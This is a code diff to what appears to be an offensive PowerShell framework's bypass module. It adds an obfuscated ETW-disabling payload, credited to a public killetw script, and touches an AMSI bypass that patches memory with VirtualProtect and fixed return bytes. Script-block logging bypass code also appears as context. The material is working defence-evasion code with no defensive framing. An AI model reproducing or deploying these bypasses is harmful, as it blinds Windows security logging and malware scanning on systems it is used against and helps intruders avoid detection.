@@ -26,6 +26,10 @@ def scriptBlockLogBypass():
     bypass += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
     return bypass
 
+def ETWBypass():
+    #tandasat killetw.ps1
+    bypass = "[System.Diagnostics.Eventing.EventProvider].\"GetFie`ld\"('m_e'+'nabled','Non'+'Public,'+'Instance').SetValue([Ref].Assembly.GetType('Syste'+'m.Management.Automation.Tracing.PSE'+'twLogProvider').\"GetFie`ld\"('et'+'wProvider','NonPub'+'lic,S'+'tatic').GetValue($null),0);"
+    return bypass
 
 def AMSIBypass():
     # @mattifestation's AMSI bypass
@@ -64,7 +68,7 @@ def AMSIBypass2():
     [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
     $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
 
-    [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6) 
+    [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6); 
     """
     bypass = bypass.replace('"kernel32"', '`"kernel32`"')
     bypass = bypass.replace('@"','"')
